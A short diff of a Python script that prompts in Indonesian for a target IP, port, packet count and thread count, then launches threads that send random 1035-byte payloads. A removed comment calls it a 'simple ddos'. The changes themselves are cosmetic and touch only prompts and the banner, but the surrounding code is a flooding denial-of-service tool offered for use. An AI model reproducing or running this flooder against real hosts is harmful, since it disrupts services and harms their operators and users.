@@ -4,12 +4,12 @@ import threading
 import os,sys
 
 
-print("Terserah kalian")
+print("Justest")
 
-p1 = str(input("IP BG GANTENG  : "))
-p2 = int(input("PORT BG GANTENG  : "))
-p3 = int(input("PAKET GANTENG : "))
-p4 = int(input("BONUS PAKETAN : "))
+p1 = str(input("Ip Bwang  : "))
+p2 = int(input("Portnya bwang  : "))
+p3 = int(input("Paketnya : "))
+p4 = int(input("Bonus Paket  : "))
 os.system("clear")
 def titid():
     pepek = random._urandom(1035)        
@@ -27,5 +27,3 @@ def titid():
 for y in range(p4):
     th = threading.Thread(target=titid)
     th.start()  
-
-simpel ddos
